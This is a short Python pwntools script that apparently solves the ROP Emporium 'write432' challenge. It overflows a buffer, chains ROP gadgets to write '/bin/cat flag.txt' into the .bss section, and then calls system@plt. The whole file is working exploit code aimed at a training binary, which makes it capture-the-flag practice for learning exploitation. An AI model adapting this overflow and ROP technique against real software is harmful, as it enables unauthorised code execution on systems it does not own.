import struct
from pwn import *
x = lambda a: struct.pack('<I', a)

# 0x8048670:  mov dword ptr [edi], ebp; ret; 
# 0x80486da:  pop edi; pop ebp; ret; 
# 0x804819d:  ret;

e = ELF("write432")
command_addr = e.bss()  # just setting this to an area that should be empty and writable

payload = ('D'*40).encode()
payload += 'BBBB'.encode()

command = r"/bin/cat flag.txt"
n = 4
l = len(command) 
for i in range(0, l, n): 
    hexed = command[i:min(i + n, l)]
    payload += x(0x80486da)  # 0x80486da:  pop edi; pop ebp; ret;
    payload += x(command_addr + i)
    payload += x(int("0x" + "".join([hex(ord(l))[2:] for l in hexed[::-1]]), 0))
    payload += x(0x8048670)  # 0x8048670:  mov dword ptr [edi], ebp; ret;

payload += x(0x08048430)  # Address of system@plt
payload += 'JJJJ'.encode()  # junk
payload += x(command_addr)

payload += '\n'.encode()
p = tubes.process.process(["./write432"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()
